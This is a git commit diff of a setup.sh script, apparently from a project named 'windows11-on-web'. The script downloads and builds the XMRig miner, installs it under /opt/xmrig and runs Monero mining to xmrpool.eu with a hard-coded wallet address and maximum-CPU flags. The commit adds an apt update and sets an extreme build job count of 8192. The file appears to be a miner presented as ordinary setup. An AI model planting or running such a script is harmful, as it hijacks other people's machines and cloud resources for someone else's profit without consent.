04b4c10530e1a30bcabb265165e8b9f143372344
Katy <135502425+windows11-on-web@users.noreply.github.com>
2024-07-05 21:45:40 +0300

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,10 +1,11 @@
+sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig
 mkdir build
 cd build
 cmake ..
-make -j32
+make -j8192
 sudo mkdir /opt/xmrig
 sudo cp ./xmrig /opt/xmrig/xmrig
 /opt/xmrig/xmrig --coin 'monero' -o xmrpool.eu:5555 -u 49Gy8KUNdFkBt62FDoNapPf8WkzEJUJobEW9Qpm1MKomAyc8JxsL57UM8VQyE8srUGQzqGv6k7JuPAvWzBwD2D6X9wbw2ck -p x --cpu-no-yield --randomx-1gb-pages --randomx-mode=fast --argon2-impl=x86_64
